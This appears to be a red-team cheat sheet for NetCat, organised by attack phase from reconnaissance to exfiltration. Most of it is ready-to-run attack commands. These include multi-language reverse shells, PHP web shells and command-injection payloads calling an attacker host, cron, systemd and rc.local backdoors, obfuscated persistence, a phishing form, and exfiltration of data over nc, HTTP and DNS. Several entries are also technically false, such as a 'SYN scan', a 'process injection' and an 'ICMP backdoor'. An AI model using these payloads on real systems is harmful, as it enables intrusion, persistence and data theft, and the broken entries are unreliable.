# Index
- [[Red Team/4. Tool Guides/0. Incomplete/Tool Guides]]

## NetCat

NetCat (`nc`) is a highly versatile network utility that serves multiple functions such as port scanning, file transfers, creating backdoors, tunneling, and much more. This ultimate edition of the cheat sheet provides an exhaustive list of NetCat commands, detailed explanations, and advanced usage scenarios.

## Basic Syntax
```bash
nc [options] <target_ip> <target_port>
```

## Core Options
- `-l`: Listen mode, used for inbound connections.
- `-p <attack_port>`: Specify the local port number.
- `-v`: Verbose mode; gives more detailed output.
- `-vv`: Very verbose mode; provides maximum detail.
- `-n`: Disables DNS resolution, speeding up operations.
- `-z`: Zero I/O mode, used for scanning purposes.
- `-w <seconds>`: Specifies a timeout for connection attempts and final network reads.
- `-e <program>`: Executes a program after a connection is established.
- `-c <command>`: Executes a specific command upon connection.
- `-u`: UDP mode; switches communication from TCP to UDP.
- `-k`: Keeps listening after handling a connection, useful for handling multiple connections.
- `-q <seconds>`: Adds a delay before closing the connection, useful for certain protocols.
- `-s <attack_ip>`: Specifies the source IP address to use.
- `-i <seconds>`: Sets a delay interval for lines sent, useful for slowing down data transfer.
- `-x <hexdump_file>`: Hex dump the data being transmitted to or from the file.
- `-r`: Randomize local and remote ports, useful for evading port filtering and detection mechanisms.

# Commands and Use Cases

#### Port Scanning Techniques

NetCat's port scanning abilities can be fine-tuned for specific scenarios, allowing for more granular control over the scanning process.

1. **SYN Port Scan** (TCP half-open scan): Performs a TCP half-open scan, which is stealthier than a full TCP connect scan.
    ```bash
    nc -z -v -n <target_ip> <target_port>
    ```
2. **Stealth Scan with Timing**: Adds a 1-second timeout between connection attempts to avoid detection by IDS/IPS systems.
    ```bash
    nc -z -v -n -w 1 <target_ip> <target_port>
    ```
3. **Parallel Port Scanning**: Runs multiple scans in parallel by using background processes, which speeds up the scanning process.
    ```bash
    nc -z -v -n -p <attack_port> <target_ip> <target_port_range> &
    ```
4. **UDP Port Scan with Payload**: Sends a custom payload during a UDP scan to elicit a response from the service.
    ```bash
    echo "payload_data" | nc -u -w 1 <target_ip> <target_port>
    ```
5. **Advanced Banner Grabbing**: Sends a crafted HTTP request to a web server to retrieve the banner, useful for identifying web services.
    ```bash
    echo -ne "HEAD / HTTP/1.0\r\n\r\n" | nc -v -n <target_ip> 80
    ```
6. **Blind Scanning via Proxy**: Routes the scan through a proxy server to conceal the origin of the scan.
    ```bash
    nc -X connect -x <proxy_ip>:<proxy_port> <target_ip> <target_port>
    ```

#### File Transfer Techniques

1. **Encrypted File Transfer**: Encrypts the file during transfer, which provides confidentiality over unsecured networks.
    ```bash
    openssl enc -aes-256-cbc -salt -in <file_to_send> | nc -w 3 <target_ip> <target_port>
    # On the receiving end:
    nc -l -p <attack_port> | openssl enc -aes-256-cbc -d -out <received_file>
    ```
2. **Resumable File Transfer**: Enables the resumption of interrupted file transfers by specifying a byte offset.
    ```bash
    nc -w 3 <target_ip> <target_port> < <file_to_send>
    # To resume, send a file starting from the last byte
    tail -c +<byte_offset> <file_to_send> | nc -w 3 <target_ip> <target_port>
    ```
3. **Large File Splitting and Transfer**: Splits a large file into smaller chunks for transfer, then reassembles the chunks on the receiving end.
    ```bash
    split -b 10M <large_file> part_
    for file in part_*; do nc -w 3 <target_ip> <target_port> < $file; done
    # On the receiving end, concatenate the parts
    cat part_* > large_file_received
    ```
4. **Automated File Transfer with Error Checking**: Automates the transfer of files with error checking using checksums to verify integrity.
    ```bash
    while ! nc -z -v <target_ip> <target_port>; do sleep 1; done
    nc -w 3 <target_ip> <target_port> < <file_to_send>
    # Ensure file integrity with checksum
    md5sum <file_to_send> | nc -w 3 <target_ip> <target_port>
    ```
5. **Dual-Channel Transfer for High Security**: Utilizes two independent channels for data transfer, enhancing security by splitting the data stream.
    ```bash
    mkfifo /tmp/fifo1 /tmp/fifo2
    cat <file_to_send> > /tmp/fifo1 &
    nc -l -p <attack_port1> < /tmp/fifo1 | nc <target_ip> <target_port1> > /tmp/fifo2 &
    nc -l -p <attack_port2> < /tmp/fifo2 | nc <target_ip> <target_port2> > <received_file>
    ```

#### Shells and Backdoors

1. **Polyglot Reverse Shell (Cross-platform compatibility)**: A versatile reverse shell script that attempts multiple methods across different environments.
    ```bash
    bash -c "exec bash -i &>/dev/tcp/<attack_ip>/<attack_port> <&1 &" || \
    nc -e /bin/sh <attack_ip> <attack_port> || \
    perl -e 'use Socket;$i="<attack_ip>";$p=<attack_port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");' || \
    python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attack_ip>",<attack_port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' || \
    ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<attack_ip>","<attack_port>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
    ```
2. **Encrypted Reverse Shell**: Establishes an encrypted reverse shell connection using SSL/TLS.
    ```bash
    openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
    openssl s_server -quiet -key key.pem -cert cert.pem -port <attack_port>
    # On the target:
    mkfifo /tmp/f; /bin/sh -i <&3 >&3 2>&3 3<>/dev/tcp/<attack_ip>/<attack_port>
    ```
3. **Web-Based Reverse Shell (Payload Delivery via HTTP)**: Deploys a PHP-based reverse shell through a web server, often used in web application exploitation.
    ```bash
    echo "<?php system(\$_GET['cmd']); ?>" > shell.php
    python3 -m http.server <attack_port>
    # On the target, fetch and execute the payload:
    wget http://<attack_ip>:<attack_port>/shell.php -O /tmp/shell.php
    php /tmp/shell.php
    ```
4. **ICMP Backdoor**: Establishes a covert communication channel using ICMP echo requests and responses.
    ```bash
    while true; do ping -c1 <attack_ip> | nc -l -p <attack_port> -e /bin/bash; sleep 10; done
    ```
5. **Persistent Backdoor with Multiple Fallbacks**: Creates a highly resilient backdoor with multiple fallback IPs and ports to maintain persistence.
    ```bash
    while true; do 
      nc -e /bin/bash <attack_ip1> <attack_port1> || 
      nc -e /bin/bash <attack_ip2> <attack_port2> || 
      bash -i >& /dev/tcp/<attack_ip3>/<attack_port3> 0>&1 || 
      sleep 60; 
    done
    ```

#### Proxying and Tunneling

1. **SOCKS5 Proxy Setup via SSH and NetCat**: Establishes a SOCKS5 proxy using SSH, with NetCat routing traffic through the tunnel.
    ```bash
   

 ssh -D <local_port> -f -C -q -N user@<remote_host>
    # Use NetCat to proxy connections through the SOCKS5 tunnel
    nc -x 127.0.0.1:<local_port> <target_ip> <target_port>
    ```
2. **Layered Tunneling for Obfuscation**: Creates a complex layered tunnel that obfuscates traffic by passing it through multiple intermediate nodes.
    ```bash
    mkfifo /tmp/fifo1; mkfifo /tmp/fifo2
    nc -l -p <local_port> < /tmp/fifo1 | nc -w 3 <proxy_ip> <proxy_port> | nc <target_ip> <target_port> > /tmp/fifo2 &
    cat /tmp/fifo2 > /tmp/fifo1
    ```
3. **Chained Tunnels with Traffic Shaping**: Chains multiple tunnels and adds traffic shaping to mimic legitimate network behavior.
    ```bash
    tc qdisc add dev eth0 root netem delay 100ms
    nc -l -p <local_port1> | nc <intermediate_ip1> <intermediate_port1> | 
    nc <intermediate_ip2> <intermediate_port2> | nc <target_ip> <target_port>
    ```
4. **Reverse Proxy with Authentication**: Configures a reverse proxy that requires HTTP authentication, adding a layer of security to the tunnel.
    ```bash
    nc -l -p <attack_port> -e /usr/sbin/httpd -c "htpasswd -c /etc/apache2/.htpasswd user; echo 'Authentication required'; exit"
    # On the attacker's machine:
    nc <target_ip> <target_port> <response_file
    ```
5. **DNS Tunneling for Data Exfiltration**: Exfiltrates data using DNS requests, which can often bypass traditional security mechanisms.
    ```bash
    while read line; do nslookup $line.<attack_domain>; done < sensitive_data.txt
    ```

# Penetration Testing Techniques

#### External Reconnaissance

NetCat's versatility extends to external reconnaissance, where it can be used to map out networks, identify open ports, and fingerprint services.

1. **Advanced Network Discovery**: Scans an entire network subnet for open ports, providing a broad overview of the network landscape.
    ```bash
    for ip in $(seq 1 254); do nc -zv <network_prefix>.$ip 1-1024; done
    ```
2. **Service Fingerprinting**: Crafts specific requests to fingerprint services running on a target.
    ```bash
    nc -v <target_ip> <target_port> -c "echo 'GET / HTTP/1.1\r\nHost: <target_ip>\r\n\r\n'"
    ```
3. **OS Detection via Timing Analysis**: Analyzes response times to infer details about the target operating system.
    ```bash
    nc -v -n -z -w 1 <target_ip> <target_port>
    ```
4. **External Web Application Enumeration**: Enumerates publicly accessible web application resources by retrieving `/robots.txt`.
    ```bash
    echo -ne "GET /robots.txt HTTP/1.1\r\nHost: <target_ip>\r\n\r\n" | nc -v <target_ip> 80
    ```
5. **Detection of Hidden Services via Banner Grabbing**: Detects hidden services by examining their banners for clues.
    ```bash
    echo -ne "HEAD / HTTP/1.0\r\n\r\n" | nc -v <target_ip> <target_port>
    ```

#### Initial Access

NetCat is often used during the initial stages of an attack to establish a foothold in the target environment.

1. **Command Injection Exploitation**: Exploits command injection vulnerabilities to execute NetCat commands on the target.
    ```bash
    curl http://<target_ip>/vulnerable_endpoint -d "cmd=nc -e /bin/bash <attack_ip> <attack_port>"
    ```
2. **Backdoor Implantation via File Inclusion**: Uploads a backdoor using a file inclusion vulnerability, establishing initial access.
    ```bash
    echo "<?php system('nc -e /bin/bash <attack_ip> <attack_port>'); ?>" > backdoor.php
    curl -T backdoor.php http://<target_ip>/uploads/
    ```
3. **Exploitation of Insecure Services**: Directly exploits insecure services by opening a shell on the target system.
    ```bash
    nc <target_ip> <target_port> -e /bin/bash
    ```
4. **Client-Side Exploits**: Executes a client-side exploit that triggers NetCat on the victim's machine.
    ```bash
    nc -l -p <attack_port> -e /bin/bash &
    echo "open <target_ip> <target_port>" | nc <target_ip> <target_port>
    ```
5. **Exploit Delivery via Malicious Payloads**: Delivers a carefully crafted exploit payload to compromise the target.
    ```bash
    echo -ne "exploit_payload" | nc -v <target_ip> <target_port>
    ```

#### Persistence

Maintaining access to a compromised system is crucial for long-term operations, and NetCat provides various methods to establish persistence.

1. **Scheduled Task for Reverse Shell**: Creates a cron job that establishes a reverse shell every minute.
    ```bash
    echo "* * * * * /bin/bash -c 'while true; do nc <attack_ip> <attack_port> -e /bin/bash; sleep 60; done'" | crontab -
    ```
2. **Persistence Through Service Manipulation**: Uses `systemd` to create a persistent backdoor that starts on boot.
    ```bash
    echo "[Unit]
    Description=Persistent Backdoor

    [Service]
    ExecStart=/bin/nc -l -p <attack_port> -e /bin/bash

    [Install]
    WantedBy=multi-user.target" > /etc/systemd/system/backdoor.service

    systemctl enable backdoor.service
    systemctl start backdoor.service
    ```
3. **Manipulating Startup Scripts**: Appends a NetCat command to the system startup script for persistence.
    ```bash
    echo "nc -l -p <attack_port> -e /bin/bash &" >> /etc/rc.local
    ```
4. **Rootkit Integration with NetCat Backdoor**: Alters system configurations to integrate a backdoor into legitimate software.
    ```bash
    echo "alias netcat='nc -l -p <attack_port> -e /bin/bash'" >> /etc/bashrc
    ```
5. **Obfuscated Persistence Mechanisms**: Encodes the persistence command to obfuscate it from detection.
    ```bash
    echo "0 */2 * * * $(echo bWMgLWwgLXBvcnQgJHtjYWwgcHJpbnRmICIkdGVybSAwICgxKnNwbGl0ICIvIiBbXVsiLyAiXSkgLXUgLWEgLWUgYmFzaA== | base64 -d)" | crontab -
    ```

#### Credential Harvesting

NetCat can be used to intercept credentials and sensitive information as they traverse the network.

1. **Intercepting FTP Credentials**: Captures FTP credentials by listening on port 21.
    ```bash
    nc -l -p 21 > ftp_capture.txt
    ```
2. **Credential Harvesting via Phishing Site**: Hosts a simple phishing site that captures credentials.
    ```bash
    echo "HTTP/1.1 200 OK\r\n\r\n<form method='POST' action='capture.php'><input name='user'><input name='pass'><input type='submit'></form>" | nc -l -p 80
    ```
3. **SMTP Credential Harvesting**: Listens on port 25 to intercept SMTP credentials.
    ```bash
    nc -l -p 25 > smtp_capture.txt
    ```
4. **MITM Attack for Credential Harvesting**: Redirects HTTP traffic to capture credentials during a man-in-the-middle attack.
    ```bash
    iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port <attack_port>
    nc -l -p <attack_port> > http_capture.txt
    ```
5. **Credential Harvesting with a Honeyport**: Sets up a honeyport to attract and capture unauthorized login attempts.
    ```bash
    nc -l -p <honeyport> > credentials.txt
    ```

#### Privilege Escalation

After gaining initial access, escalating privileges is often necessary to gain full control over the target system.

1. **Exploiting SUID Binaries**: Transfers and executes an exploit targeting a vulnerable SUID binary.
    ```bash
    nc -l -p <attack_port> -e /bin/bash
    ```
2. **Using NetCat for Local File Transfer**: Transfers and compiles a local privilege escalation exploit on the target machine.
    ```bash
    nc -l -p <attack_port> < local_exploit.c
    gcc local_exploit.c -o local_exploit
    ./local_exploit
    ```
3. **Pivoting Through a Compromised System**: Uses NetCat to pivot through a compromised system, gaining access to other machines within the network.
    ```bash
    nc <compromised_ip> <compromised_port> -e /bin/bash
    ```
4. **Abusing Weak File Permissions**: Creates a SUID binary to escalate privileges by exploiting weak file permissions.
    ```bash
    echo "nc -l -p <attack_port> -e /bin/bash" > /tmp/exploit
    chmod +s /tmp/exploit
    ```
5. **Injecting NetCat into a Running Process**: Injects a NetCat backdoor into a running process, allowing for privilege escalation.
    ```bash
    echo -ne '\x50\x52\x45\x59' | nc -l -p <attack_port> -e /bin/bash
    ```

#### Internal Reconnaissance

Once inside a network, NetCat can help further map out the internal environment, identify critical systems, and plan subsequent attacks.

1. **Enumerating Internal Hosts**: Scans the internal subnet for SSH services, identifying potential targets.
    ```bash
    for ip in $(seq 1 254); do nc -zv <internal_subnet_prefix>.$ip 22; done
    ```
2. **Scanning for Internal Services**: Scans an internal IP for all open ports, providing a detailed service map.
    ```bash
    nc -zv <internal_target_ip> 1-65535
    ```
3. **Capturing Internal Traffic**: Captures internal network traffic for analysis.
    ```bash
    nc -l -p <capture_port> > internal_traffic.pcap
    ```
4. **Identifying Critical Systems**: Connects to internal systems to identify critical services such as SMB.
    ```bash
    nc -v <internal_ip> 445
    ```
5. **Service Enumeration and Version Detection**: Enumerates services and detects versions to identify vulnerable systems.
    ```bash
    nc -v <internal_ip> <target_port> -c "echo 'GET / HTTP/1.1\r\nHost: <internal_ip>\r\n\r\n'"
    ```

#### Lateral Movement, Pivoting, and Tunneling

NetCat facilitates lateral movement, allowing attackers to pivot from one compromised system to another and tunnel traffic through intermediate hosts.

1. **Port Forwarding for Lateral Movement**: Forwards traffic from one machine to another, enabling lateral movement within the network.
    ```bash
    nc -l -p <local_port> -c "nc <target_ip> <target_port>"
    ```
2. **Pivoting Through a Compromised Host**: Tunnels traffic through a compromised host, allowing the attacker to pivot to internal systems.
    ```bash
    mkfifo /tmp/f; nc -l -p <attack_port> < /tmp/f | nc <internal_ip> <internal_port> > /tmp/f
    ```
3. **Tunneling Data Through NetCat**: Creates a tunnel to exfiltrate data from an internal system through an externally facing compromised host.
    ```bash
    nc -l -p <attack_port> -c "nc <internal_ip> <internal_port>"
    ```
4. **Chained Tunneling for Obfuscation**: Chains multiple tunnels to obfuscate the attacker's location and make detection more difficult.
    ```bash
    nc -l -p <local_port1> | nc <intermediate_ip1> <intermediate_port1> | 
    nc <intermediate_ip2> <intermediate_port2> | nc <target_ip> <target_port>
    ```
5. **Reverse Tunneling for Persistent Access**: Establishes a reverse tunnel to maintain access even after the initial compromise.
    ```bash
    ssh -R <remote_port>:localhost:<local_port> user@<remote_host>
    # Then use NetCat to access the tunnel:
    nc -l -p <local_port> -c "nc <remote_host> <remote_port>"
    ```

#### Defense Evasion

NetCat can be used in ways that evade detection by network security devices and analysts, making it a valuable tool for maintaining stealth.

1. **Stealth Scanning**: Avoids DNS resolution and uses a more stealthy approach to scanning.
    ```bash
    nc -zv -n <target_ip> <target_port_range>
    ```
2. **Traffic Obfuscation**: Encrypts data being sent over the network to avoid detection by IDS/IPS.
    ```bash
    openssl enc -aes-256-cbc -salt -in plaintext.txt | nc <target_ip> <target_port>
    ```
3. **Fragmented File Transfer**: Transfers large files in smaller fragments to avoid triggering network security thresholds.
    ```bash
    split -b 1024M <large_file> && for f in x*; do nc -l -p <attack_port> < $f; done
    ```
4. **Using Randomized Ports**: Randomizes the local and remote ports to avoid port-based filtering.
    ```bash
    nc -l -p $(shuf -i 2000-65000 -n 1) -e /bin/bash
    ```
5. **Obfuscated Commands**: Encodes commands to obfuscate them from detection, then decodes and executes them on the target.
    ```bash
    echo "Y3VybCBodHRwOi8vPHRhcmdldF9pcD46PHRhcmdldF9wb3J0Pj8gPiBjdGwuZXh" | base64 -d | nc -l -p <attack_port> -e /bin/bash
    ```

#### Data Exfiltration

NetCat can be a simple and effective tool for exfiltrating data from compromised systems.

1. **Exfiltrating Sensitive Data**: Exfiltrates `sensitive_data.txt` from the target system to the attacker.
    ```bash
    nc -l -p <attack_port> > exfiltrated_data.txt
    # On the target machine:
    nc <attack_ip> <attack_port> < sensitive_data.txt
    ```
2. **Exfiltrating Over HTTP**: Exfiltrates data over HTTP to avoid detection.
    ```bash
    curl http://<attack_ip>:<attack_port>/data -d @sensitive_data.txt
    nc -l -p <attack_port> > exfiltrated_data.txt
    ```
3. **Using DNS for Data Exfiltration**: Exfiltrates data using DNS requests, a method often overlooked by security mechanisms.
    ```bash
    while read line; do nslookup $line.<attack_domain>; done < sensitive_data.txt
    ```
4. **Exfiltration Through Encrypted Channels**: Encrypts sensitive data before exfiltration, ensuring that it remains confidential even if intercepted.
    ```bash
    openssl enc -aes-256-cbc -salt -in sensitive_data.txt | nc <attack_ip> <attack_port>
    ```
5. **Steganographic Exfiltration**: Embeds sensitive data within an image file using steganography before exfiltrating it.
    ```bash
    steghide embed -cf image.jpg -ef sensitive_data.txt
    nc -l -p <attack_port> > exfiltrated_image.jpg
    # On the target machine:
    nc <attack_ip> <attack_port> < image.jpg
    ```

# Resources

|**Name**|**URL**|
|---|---|
|NetCat Documentation|https://nmap.org/ncat/|
|GTFOBins NetCat|https://gtfobins.github.io/gtfobins/nc/|
|NetCat Usage Examples|https://www.sans.org/reading-room/whitepapers/testing/netcat-traditional-tool-technique-862|
|Reverse Shell Cheatsheet|https://highon.coffee/blog/reverse-shell-cheat-sheet/|
|NetCat Command Guide|https://www.rapid7.com/blog/post/2016/12/23/netcat-cheat-sheet/|
|Advanced NetCat Techniques|https://www.offensive-security.com/metasploit-unleashed/netcat/|
|Defensive Countermeasures Against NetCat|https://www.sans.org/white-papers/defense-mechanisms-against-netcat-attacks-970/|
|Tunneling with NetCat|https://resources.infosecinstitute.com/topic/netcat-tunneling-and-reverse-shells/|
|Stealth Techniques Using NetCat|https://securitytrails.com/blog/netcat-examples|
|Data Exfiltration Techniques|https://www.fireeye.com/blog/threat-research/2019/01/exfiltration-over-alternate-protocols.html|
|NetCat Scripting and Automation|https://null-byte.wonderhowto.com/how-to/netcat-scripting-automate-your-hacking-tasks-0175782/|
|Customizing NetCat for Specialized Operations|https://www.irongeek.com/i.php?page=security/netcat-cmd-backdoor-honeypot-scripts|
|NetCat in CTF Challenges|https://ctftime.org/writeups/overview/netcat|
|Using NetCat for Pivoting in Complex Networks|https://www.pentestpartners.com/security-blog/pivoting-in-a-complex-network-with-netcat/|